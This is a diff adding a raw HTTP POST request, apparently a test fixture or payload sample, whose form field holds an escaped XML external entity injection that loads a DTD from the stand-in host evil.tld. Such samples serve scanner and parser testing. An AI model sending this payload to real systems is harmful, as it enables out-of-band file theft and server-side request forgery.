@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 170
+Connection: close
+
+s=\u003C?xml version=\u00221.0\u0022?\u003E\u003C!DOCTYPE r [\u003C!ENTITY x SYSTEM \u0022http://evil.tld/x.dtd\u0022\u003E]\u003E\u003Cr\u003E\u0026x\u003B\u003C/r\u003E
